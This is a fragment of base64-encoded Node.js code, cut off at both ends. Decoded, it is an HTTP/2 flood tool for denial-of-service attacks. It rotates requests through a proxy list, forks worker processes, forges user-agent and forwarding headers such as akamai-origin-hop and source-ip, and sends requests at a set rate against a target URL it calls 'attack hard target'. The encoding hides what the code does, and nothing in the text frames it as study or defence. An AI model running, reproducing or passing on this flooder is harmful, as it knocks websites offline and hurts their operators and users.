yYS83Ny4wLjQwNTQuMTcyIgpdOwpjb25zdCBza2lkID0gWwogICAgIjEwMDA1NDY1MjM3IiwKICAgICI4ODUxMDY0NjM0IiwKICAgICI4OTMxMzY0NjI1MyIsCiAgICAiMjIwNjQyMzk0MiIsCiAgICAiMTI2MzU0OTU2MzEiCl07CmNvbnN0IGxvbCA9IHNraWRbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogc2tpZC5sZW5ndGgpXTsKY29uc3QgcmFuZG9tT1MgPSBnZXRSYW5kb21WYWx1ZShvcGVyYXRpbmdTeXN0ZW1zKTsKY29uc3QgcmFuZG9tQXJjaCA9IGFyY2hpdGVjdHVyZXNbcmFuZG9tT1NdOwpjb25zdCByYW5kb21Ccm93c2VyID0gZ2V0UmFuZG9tVmFsdWUoYnJvd3NlcnMpOwpjb25zdCB1YXAgPSBgTW96aWxsYS81LjAgKCR7cmFuZG9tT1N9OyAke2xvbH07ICR7cmFuZG9tQXJjaH0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pICR7cmFuZG9tQnJvd3Nlcn1gOwoKY29uc3Qgc2lnYWxncyA9IFsKICAgICAgICdlY2RzYV9zZWNwMjU2cjFfc2hhMjU2JywKICAgICAgICdlY2RzYV9zZWNwMzg0cjFfc2hhMzg0JywKICAgICAgICdlY2RzYV9zZWNwNTIxcjFfc2hhNTEyJywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhMjU2JywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhMzg0JywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhNTEyJywKICAgICAgICdyc2FfcGtjczFfc2hhMjU2JywKICAgICAgICdyc2FfcGtjczFfc2hhMzg0JywKICAgICAgICdyc2FfcGtjczFfc2hhNTEyJywKXSAKbGV0IFNpZ25hbHNMaXN0ID0gc2lnYWxncy5qb2luKCc6JykKY29uc3QgZWNkaEN1cnZlID0gIkdSRUFTRTpYMjU1MTk6eDI1NTE5OlAtMjU2OlAtMzg0OlAtNTIxOlg0NDgiOyJHUkVBU0U6WDI1NTE5OngyNTUxOSI7Cgpjb25zdCBzZWN1cmVPcHRpb25zID0gCmNyeXB0by5jb25zdGFudHMuU1NMX09QX05PX1NTTHYyIHwKY3J5cHRvLmNvbnN0YW50cy5TU0xfT1BfTk9fU1NMdjMgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19UTFN2MSB8CmNyeXB0by5jb25zdGFudHMuU1NMX09QX05PX1RMU3YxXzEgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19UTFN2MV8zIHwKY3J5cHRvLmNvbnN0YW50cy5BTFBOX0VOQUJMRUQgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9BTExPV19VTlNBRkVfTEVHQUNZX1JFTkVHT1RJQVRJT04gfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9DSVBIRVJfU0VSVkVSX1BSRUZFUkVOQ0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9MRUdBQ1lfU0VSVkVSX0NPTk5FQ1QgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9DT09LSUVfRVhDSEFOR0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9QS0NTMV9DSEVDS18xIHwKY3J5cHRvLmNvbnN0YW50cy5TU0xfT1BfUEtDUzFfQ0hFQ0tfMiB8CmNyeXB0by5jb25zdGFudHMuU1NMX09QX1NJTkdMRV9ESF9VU0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9TSU5HTEVfRUNESF9VU0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19TRVNTSU9OX1JFU1VNUFRJT05fT05fUkVORUdPVElBVElPTjsKCmNvbnN0IHNlY3VyZVByb3RvY29sID0gIlRMU19jbGllbnRfbWV0aG9kIjsiVExTdjFfM19tZXRob2QiLCJUTFNfbWV0aG9kIjsKY29uc3QgaGVhZGVycyA9IHt9OwoKY29uc3Qgc2VjdXJlQ29udGV4dE9wdGlvbnMgPSB7CiAgICBjaXBoZXJzOiBjaXBoZXJzLAogICAgc2lnYWxnczogU2lnbmFsc0xpc3QsCiAgICBob25vckNpcGhlck9yZGVyOiB0cnVlLAogICAgc2VjdXJlT3B0aW9uczogc2VjdXJlT3B0aW9ucywKICAgIHNlY3VyZVByb3RvY29sOiBzZWN1cmVQcm90b2NvbAp9OwoKY29uc3Qgc2VjdXJlQ29udGV4dCA9IHRscy5jcmVhdGVTZWN1cmVDb250ZXh0KHNlY3VyZUNvbnRleHRPcHRpb25zKTsKY29uc3QgcmF0ZUhlYWRlcnMgPSBbCiAgIHsgImFrYW1haS1vcmlnaW4taG9wIjogcmFuZHN0cig1KX0sCiAgIHsgInNvdXJjZS1pcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInZpYSI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgImNsdXN0ZXItaXAiOiByYW5kc3RyKDUpICB9LAogICB7ICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3QiIDogIjEifSwKICAgeyJhY2NlcHQiOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSphY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgeyJhY2NlcHQtY2hhcnNldCIgOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSphY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgeyJDYWNoZS1Db250cm9sIiA6ICduby1jYWNoZSd9LAogICB7InByYWdtYSIgOiAibm8tY2FjaGUifSwKICAgeyJ4LXhzcy1wcm90ZWN0aW9uIiA6ICIxO21vZGU9YmxvY2sifSwgCiAgIHsieC1jb250ZW50LXR5cGUtb3B0aW9ucyIgOiAibm9zbmlmZiJ9LAogICB7J2FjY2VwdC1kYXRldGltZScgOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSphY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgXTsKICAgY29uc3QgcmF0ZUhlYWRlcnMyID0gWwogICB7ICJha2FtYWktb3JpZ2luLWhvcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInNvdXJjZS1pcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInZpYSI6IHJhbmRzdHIoNSkgIH0sCiAgIHsiWC1WZXJjZWwtQ2FjaGUiOiByYW5kc3RyKDUpIH0sCiAgIHsgImNsdXN0ZXItaXAiOiByYW5kc3RyKDUpICB9LAogICB7IlgtUmVxdWVzdGVkLVdpdGgiOiAnWE1MSHR0cFJlcXVlc3QnfSwKICAgeyJYLUZyYW1lLU9wdGlvbnMiOiAiZGVueSJ9LAogICB7J01heC1Gb3J3YXJkcyc6ICcxMCd9LAogICB7J1JlZnJlc2gnOiAnNSd9LAogICB7J2FjY2VwdC1sYW5ndWFnZScgOiBsYW5ndWFnZV9oZWFkZXJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKmxhbmd1YWdlX2hlYWRlci5sZW5ndGgpXX0sCiAgIHsnYWNjZXB0LWVuY29kaW5nJyA6IEdlbmVyYXRlX0VuY29kaW5nW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpHZW5lcmF0ZV9FbmNvZGluZy5sZW5ndGgpXX0KICAgXTsKY29uc3QgZHluSGVhZGVycyA9IHsKICAgLi4uaGVhZGVycywKICAgLi4ucmF0ZUhlYWRlcnMyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpyYXRlSGVhZGVycy5sZW5ndGgpXSwKICAgLi4ucmF0ZUhlYWRlcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKnJhdGVIZWFkZXJzLmxlbmd0aCldCiB9Owpjb25zdCBhcmdzID0gewogICAgdGFyZ2V0OiBwcm9jZXNzLmFyZ3ZbMl0sCiAgICB0aW1lOiB+fnByb2Nlc3MuYXJndlszXSwKICAgIFJhdGU6IH5+cHJvY2Vzcy5hcmd2WzRdLAogICAgdGhyZWFkczogfn5wcm9jZXNzLmFyZ3ZbNV0sCiAgICBwcm94eUZpbGU6IHByb2Nlc3MuYXJndls2XQp9Cgp2YXIgcHJveGllcyA9IHJlYWRMaW5lcyhhcmdzLnByb3h5RmlsZSk7CmNvbnN0IHBhcnNlZFRhcmdldCA9IHVybC5wYXJzZShhcmdzLnRhcmdldCk7CmNvbG9ycy5lbmFibGUoKTsKY29uc3QgY29sb3JlZFN0cmluZyA9ICJhdHRhY2sgaGFyZCB0YXJnZXQiLndoaXRlOwppZiAoY2x1c3Rlci5pc01hc3RlcikgewogICBmb3IgKGxldCBjb3VudGVyID0gMTsgY291bnRlciA8PSBhcmdzLnRocmVhZHM7IGNvdW50ZXIrKykgewogICBjb25zb2xlLmxvZygnSG9zdDogJytwcm9jZXNzLmFyZ3ZbMl0pOwogY29uc29sZS5sb2coJ1RpbWU6ICcrcHJvY2Vzcy5hcmd2WzNdKTsKIGNvbnNvbGUubG9nKCdSYXRlOiAnK3Byb2Nlc3MuYXJndls0XSk7CiBjb25zb2xlLmxvZygnVGhyZWFkKHMpOiAnK3Byb2Nlc3MuYXJndls1XSk7CiBjb25zb2xlLmxvZyhgUHJveHlGaWxlOiAke2FyZ3MucHJveHlGaWxlfSB8IFRvdGFsOiAke3Byb3hpZXMubGVuZ3RofWApOwogICAgICAgY2x1c3Rlci5mb3JrKCk7CgogICB9Cn0gZWxzZSB7Zm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7IHNldEludGVydmFsKHJ1bkZsb29kZXIsIDEpIH19CgpjbGFzcyBOZXRTb2NrZXQgewogICAgY29uc3RydWN0b3IoKXt9CgogSFRUUChvcHRpb25zLCBjYWxsYmFjaykgewogICAgY29uc3QgcGFyc2VkQWRkciA9IG9wdGlvbnMuYWRkcmVzcy5zcGxpdCgiOiIpOwogICAgY29uc3QgYWRkckhvc3QgPSBwYXJzZWRBZGRyWzBdOwogICAgY29uc3QgcGF5bG9hZCA9ICJDT05ORUNUICIgKyBvcHRpb25zLmFkZHJlc3MgKyAiOjQ0MyBIVFRQLzEuMVxyXG5Ib3N0OiAiICsgb3B0aW9ucy5hZGRyZXNzICsgIjo0NDNcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5cclxuIjsgLy9LZWVwIEFsaXZlCiAgICBjb25zdCBidWZmZXIgPSBuZXcgQnVmZmVyLmZyb20ocGF5bG9hZCk7CgogICAgY29uc3QgY29ubmVjdGlvbiA9IG5ldC5jb25uZWN0KHsKICAgICAgICBob3N0OiBvcHRpb25zLmhvc3QsCiAgICAgICAgcG9ydDogb3B0aW9ucy5wb3J0LAogICAgICAgIGFsbG93SGFsZk9wZW46IHRydWUsCiAgICAgICAgd3JpdGFibGU6IHRydWUsCiAgICAgICAgcmVhZGFibGU6IHRydWUKICAgIH0pOwoKICAgIGNvbm5lY3Rpb24uc2V0VGltZW91dChvcHRpb25zLnRpbWVvdXQgKiA2MDAwMDApOwogICAgY29ubmVjdGlvbi5zZXRLZWVwQWxpdmUodHJ1ZSwgMTAwMDAwKTsKICAgIGNvbm5lY3Rpb24uc2V0Tm9EZWxheSh0cnVlKQogICAgY29ubmVjdGlvbi5vbigiY29ubmVjdCIsICgpID0+IHsKICAgICAgIGNvbm5lY3Rpb24ud3JpdGUoYnVmZmVyKTsKICAgfSk7CgogICBjb25uZWN0aW9uLm9uKCJkYXRhIiwgY2h1bmsgPT4gewogICAgICAgY29uc3QgcmVzcG9uc2UgPSBjaHVuay50b1N0cmluZygidXRmLTgiKTsKICAgICAgIGNvbnN0IGlzQWxpdmUgPSByZXNwb25zZS5pbmNsdWRlcygiSFRUUC8xLjEgMjAwIik7CiAgICAgICBpZiAoaXNBbGl2ZSA9PT0gZmFsc2UpIHsKICAgICAgICAgICBjb25uZWN0aW9uLmRlc3Ryb3koKTsKICAgICAgICAgICByZXR1cm4gY2FsbGJhY2sodW5kZWZpbmVkLCAiZXJyb3I6IGludmFsaWQgcmVzcG9uc2UgZnJvbSBwcm94eSBzZXJ2ZXIiKTsKICAgICAgIH0KICAgICAgIHJldHVybiBjYWxsYmFjayhjb25uZWN0aW9uLCB1bmRlZmluZWQpOwogICB9KTsKCiAgIGNvbm5lY3Rpb24ub24oInRpbWVvdXQiLCAoKSA9PiB7CiAgICAgICBjb25uZWN0aW9uLmRlc3Ryb3koKTsKICAgICAgIHJldHVybiBjYWxsYmFjayh1bmRlZmluZWQsICJlcnJvcjogdGltZW91dCBleGNlZWRlZCIpOwogICB9KTsKCn0KfQpmdW5jdGlvbiBjb29raWVTdHJpbmcoY29va2llKSB7CiAgIHZhciBzID0gIiI7CiAgIGZvciAodmFyIGMgaW4gY29va2llKSB7CiAgICAgcyA9IGAke3N9ICR7Y29va2llW2NdLm5hbWV9PSR7Y29va2llW2NdLnZhbHVlfTtgOwogICB9CiAgIHZhciBzID0gcy5zdWJzdHJpbmcoMSk7CiAgIHJldHVybiBzLnN1YnN0cmluZygwLCBzLmxlbmd0aCAtIDEpOwogfQoKY29uc3QgU29ja2VyID0gbmV3IE5ldFNvY2tldCgpOwoKZnVuY3Rpb24gcmVhZExpbmVzKGZpbGVQYXRoKSB7CiAgICByZXR1cm4gZnMucmVhZEZpbGVTeW5jKGZpbGVQYXRoLCAidXRmLTgiKS50b1N0cmluZygpLnNwbGl0KC9ccj9cbi8pOwp9CgoKZnVuY3Rpb24gcmFuZG9tSW50bihtaW4sIG1heCkgewogICAgcmV0dXJuIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIChtYXggLSBtaW4pICsgbWluKTsKfQoKZnVuY3Rpb24gcmFuZG9tRWxlbWVudChlbGVtZW50cykgewogICAgcmV0dXJuIGVsZW1lbnRzW3JhbmRvbUludG4oMCwgZWxlbWVudHMubGVuZ3RoKV07Cn0KZnVuY3Rpb24gcnVuRmxvb2RlcigpIHsKICAgIGNvbnN0IHByb3h5QWRkciA9IHJhbmRvbUVsZW1lbnQocHJveGllcyk7CiAgICBjb25zdCBwYXJzZWRQcm94eSA9IHByb3h5QWRkci5zcGxpdCgiOiIpOwogICAgY29uc3QgcGFyc2VkUG9ydCA9IHBhcnNlZFRhcmdldC5wcm90b2NvbCA9PSAiaHR0cHM6IiA/ICI0NDMiIDogIjgwIgoKICAgIGxldCB1c2VyQWdlbnQgPSByYW5kb21Vc2VyYWdlbnQuZ2V0UmFuZG9tKGZ1bmN0aW9uICh1YSkgewogICAgICAgcmV0dXJuIHVhLmJyb3dzZXJOYW1lID09PSAnRmlyZWZveCc7CiAgIH0pOwoKICAgbGV0IGhlYWRlcnMgPSB7CiAgICAgICAiOmF1dGhvcml0eSI6IE1hdGgucmFuZG9tKCkgPCAwLjUgPyBwYXJzZWRUYXJnZXQuaG9zdCArIChNYXRoLnJhbmRvbSgpIDwgMC41ID8gJy4nIDogJycpIDogKCd3d3cuJysgcGFyc2VkVGFyZ2V0Lmhvc3QgKyAoTWF0aC5yYW5kb20oKSA8IDAuNSA/ICcuJyA6ICcnKSksCiAgICAgICAiOm1ldGhvZCI6ICJHRVQiLAogICAgICAgInJlZmVyZXIiIDogImh0dHBzOi8vIiArIHBhcnNlZFRhcmdldC5ob3N0ICsgcGFyc2VkVGFyZ2V0LnBhdGgsCiAgICAgICAiQWNjZXB0IiA6IGFjY2VwdF9oZWFkZXJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogYWNjZXB0X2hlYWRlci5sZW5ndGgpXSwKICAgICAgICI6cGF0aCI6IHBhcnNlZFRhcmdldC5wYXRoICsgIj9GVUNLWU9VIiwKICAgICAgICI6c2NoZW1lIjogImh0dHBzIiwKICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIiA6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAidXNlci1hZ2VudCI6IHVhcCwKICAgfQoKICAgIGNvbnN0IHByb3h5T3B0aW9ucyA9IHsKICAgICAgICBob3N0OiBwYXJzZWRQcm94eVswXSwKICAgICAgICBwb3J0OiB+fnBhcnNlZFByb3h5WzFdLAogICAgICAgIGFkZHJlc3M6IHBhcnNlZFRhcmdldC5ob3N0ICsgIjo0NDMiLAogICAgICAgIHRpbWVvdXQ6IDEwMAogICAgfTsKCiAgICBTb2NrZXIuSFRUUChwcm94eU9wdGlvbnMsIChjb25uZWN0aW9uLCBlcnJvcikgPT4gewogICAgICAgIGlmIChlcnJvcikgcmV0dXJuCgogICAgICAgIGNvbm5lY3Rpb24uc2V0S2VlcEFsaXZlKHRydWUsIDEwMDAwMCk7CiAgICAgICAgY29ubmVjdGlvbi5zZXROb0RlbGF5KHRydWUpCgogICAgICAgIGNvbnN0IHNldHRpbmdzID0gewogICAgICAgICAgIGVuYWJsZVB1c2g6IGZhbHNlLAogICAgICAgICAgIGluaXRpYWxXaW5kb3dTaXplOiAxMDczNzQxODIzCiAgICAgICB9OwoKICAgICAgICBjb25zdCB0bHNPcHRpb25zID0gewogICAgICAgICAgIHBvcnQ6IHBhcnNlZFBvcnQsCiAgICAgICAgICAgc2VjdXJlOiB0cnVlLAogICAgICAgICAgIEFMUE5Qcm90b2NvbHM6IFsKICAgICAgICAgICAgICAgImgyIiwiaDMiLCJodHRwLzEuMSIKICAgICAgICAgICBdLAogICAgICAgICAgIGNpcGhlcnM6IGNpcGhlcnMsCiAgICAgICAgICAgc2lnYWxnczogc2lnYWxncywKICAgICAgICAgICByZXF1ZXN0Q2VydDogdHJ1ZSwKICAgICAgICAgICBzb2NrZXQ6IGNvbm5lY3Rpb24sCiAgICAgICAgICAgZWNkaEN1cnZlOiBlY2RoQ3VydmUsCiAgICAgICAgICAgaG9ub3JDaXBoZXJPcmRlcjogZmFsc2UsCiAgICAgICAgICAgZm9sbG93QWxsUmVkaXJlY3RzOiB0cnVlLAogICAgICAgICAgIGNoYWxsZW5nZVRvU29sdmU6IDQ1LAogICAgICAgICAgIGNsaWVudFRpbWVvdXQ6IDIwMDAwLAogICAgICAgICAgIGNsaWVudGxhcmVNYXhUaW1lb3V0OiA1MDAwLAogICAgICAgICAgIGhvc3Q6IHBhcnNlZFRhcmdldC5ob3N0LAogICAgICAgICAgIHJlamVjdFVuYXV0aG9yaXplZDogZmFsc2UsCiAgICAgICAgICAgY2xpZW50Q2VydEVuZ2luZTogIkRZTkFNSUMiLAogICAgICAgICAgIHNlY3VyZU9wdGlvbnM6IHNlY3VyZU9wdGlvbnMsCiAgICAgICAgICAgc2VjdXJlQ29udGV4dDogc2VjdXJlQ29udGV4dCwKICAgICAgICAgICBzZXJ2ZXJuYW1lOiBwYXJzZWRUYXJnZXQuaG9zdCwKICAgICAgICAgICBzZWN1cmVQcm90b2NvbDogc2VjdXJlUHJvdG9jb2wKICAgICAgIH07CgogICAgICAgIGNvbnN0IHRsc0Nvbm4gPSB0bHMuY29ubmVjdChwYXJzZWRQb3J0LCBwYXJzZWRUYXJnZXQuaG9zdCwgdGxzT3B0aW9ucyk7IAoKICAgICAgICB0bHNDb25uLmFsbG93SGFsZk9wZW4gPSB0cnVlOwogICAgICAgIHRsc0Nvbm4uc2V0Tm9EZWxheSh0cnVlKTsKICAgICAgICB0bHNDb25uLnNldEtlZXBBbGl2ZSh0cnVlLCA2MCAqIDEwMDAwMCk7CiAgICAgICAgdGxzQ29ubi5zZXRNYXhMaXN0ZW5lcnMoMCk7CgogICAgICAgIGNvbnN0IGNsaWVudCA9IGh0dHAyLmNvbm5lY3QocGFyc2VkVGFyZ2V0LmhyZWYsIHsKICAgICAgICAgICBwcm90b2NvbDogImh0dHBzOiIsCiAgICAgICAgICAgc2V0dGluZ3M6IHsKICAgICAgICAgICAgICAgaGVhZGVyVGFibGVTaXplOiA2NTUzNiwKICAgICAgICAgICAgICAgbWF4Q29uY3VycmVudFN0cmVhbXM6IDEwMDAsCiAgICAgICAgICAgICAgIGluaXRpYWxXaW5kb3dTaXplOiA2MjkxNDU2LAogICAgICAgICAgICAgICBtYXhIZWFkZXJMaXN0U2l6ZTogMjYyMTQ0LAogICAgICAgICAgICAgICBlbmFibGVQdXNoOiBmYWxzZQogICAgICAgICAgIH0sCiAgICAgICAgICAgbWF4U2Vzc2lvbk1lbW9yeTogMzMzMywKICAgICAgICAgICBtYXhEZWZsYXRlRHluYW1pY1RhYmxlU2l6ZTogNDI5NDk2NzI5NSwKICAgICAgICAgICBjcmVhdGVDb25uZWN0aW9uOiAoKSA9PiB0bHNDb25uLAogICAgICAgICAgIHNvY2tldDogY29ubmVjdGlvbiwKICAgICAgIH0pOwoKICAgICAgIGNsaWVudC5zZXR0aW5ncyh7CiAgICAgICAgICAgaGVhZGVyVGFibGVTaXplOiA2NTUzNiwKICAgICAgICAgICBtYXhDb25jdXJyZW50U3RyZWFtczogMTAwMCwKICAgICAgICAgICBpbml0aWFsV2luZG93U2l6ZTogNjI5MTQ1NiwKICAgICAgICAgICBtYXhIZWFkZXJMaXN0U2l6ZTogMjYyMTQ0LAogICAgICAgICAgIG1heEZyYW1lU2l6ZSA6IDQwMDAwLAogICAgICAgICAgIGVuYWJsZVB1c2g6IGZhbHNlCiAgICAgICB9KTsKCiAgICAgICBjbGllbnQuc2V0TWF4TGlzdGVuZXJzKDApOwogICAgICAgY2xpZW50LnNldHRpbmdzKHNldHRpbmdzKTsKCiAgICAgICAgY2xpZW50Lm9uKCJjb25uZWN0IiwgKCkgPT4gewogICAgICAgICAgIGNvbnN0IEludGVydmFsQXR0YWNrID0gc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyZ3MuUmF0ZTsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjbGllbnQucmVxdWVzdChoZWFkZXJzKQogICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgLm9uKCJyZXNwb25zZSIsIHJlc3BvbnNlID0+IHsKICAgICAgICAgICAgICAgICAgICAgICBpZihyZXNwb25zZVsnc2V0LWNvb2tpZSddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnNbImNvb2tpZSJdID0gY29va2llU3RyaW5nKHNjcC5wYXJzZShyZXNwb25zZVsic2V0LWNvb2tpZSJdKSkKICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdC5jbG9zZSgpOwogICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3QuZGVzdHJveSgpOwogICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICByZXF1ZXN0LmVuZCgpOwogICAgICAgICAgICAgICB9CiAgICAgICAgICAgfSwgNTUwKTsgCiAgICAgICAgfSk7CgogICAgICAgIGNsaWVudC5vbigiY2xvc2UiLCAoKSA9PiB7CiAgICAgICAgICAgIGNsaWVudC5kZXN0cm95KCk7CiAgICAgICAgICAgIGNvbm5lY3Rpb24uZGVzdHJveSgpOwogICAgICAgICAgICByZXR1cm4KICAgICAgICB9KTsKCiAgICAgICAgY2xpZW50Lm9uKCJlcnJvciIsIGVycm9yID0+IHsKICAgICAgICAgICAgY2xpZW50LmRlc3Ryb3koKTsKICAgICAgICAgICAgY29ubmVjdGlvbi5kZXN0cm95KCk7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0pOwogICAgfSk7Cn0KCmNvbnN0IFN0b3BTY3JpcHQgPSAoKSA9PiBwcm9jZXNzLmV4aXQoMSk7CgpzZXRUaW1lb3V0KFN0b3BTY3JpcHQsIGFyZ3MudGltZSAqIDEwMDApOwoKcHJvY2Vzcy5vbigndW5jYXVnaHRFeGNlcHRpb24nLCBlcnJvciA9PiB7fSk7CnByb2Nlc3Mub24oJ3VuaGFuZGxlZFJlamVjdGlvbicsIGVycm9yID0+IHt9KTsKY29uc3QgY2xpZW50ID0gaHR0cDIuY29ubmVjdChwYXJzZWQuaHJlZiwgY2xpZW50T3B0aW9ucywgZnVuY3Rpb24oKSB7CiB9KTsKCg==

const code = Buffer.from("Y29uc3QgbmV0ID0gcmVxdWlyZSgibmV0Iik7CmNvbnN0IGh0dHAyID0gcmVxdWlyZSgiaHR0cDIiKTsKY29uc3QgdGxzID0gcmVxdWlyZSgidGxzIik7CmNvbnN0IGNsdXN0ZXIgPSByZXF1aXJlKCJjbHVzdGVyIik7CmNvbnN0IHVybCA9IHJlcXVpcmUoInVybCIpOwpjb25zdCBjcnlwdG8gPSByZXF1aXJlKCJjcnlwdG8iKTsKY29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOwpjb25zdCBzY3AgPSByZXF1aXJlKCJzZXQtY29va2llLXBhcnNlciIpOwp2YXIgY29sb3JzID0gcmVxdWlyZSgiY29sb3JzIik7CmNvbnN0IHJhbmRvbVVzZXJhZ2VudCA9IHJlcXVpcmUoJ3JhbmRvbS11c2VyYWdlbnQnKTsKZnVuY3Rpb24gcmFuZHN0cihsZW5ndGgpIHsKICAgY29uc3QgY2hhcmFjdGVycyA9CiAgICAgIkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5IjsKICAgbGV0IHJlc3VsdCA9ICIiOwogICBjb25zdCBjaGFyYWN0ZXJzTGVuZ3RoID0gY2hhcmFjdGVycy5sZW5ndGg7CiAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICByZXN1bHQgKz0gY2hhcmFjdGVycy5jaGFyQXQoTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogY2hhcmFjdGVyc0xlbmd0aCkpOwogICB9CiAgIHJldHVybiByZXN1bHQ7CiB9CgoKY29uc3QgYWNjZXB0X2hlYWRlciA9IFsKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjMnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbicsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24nLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbD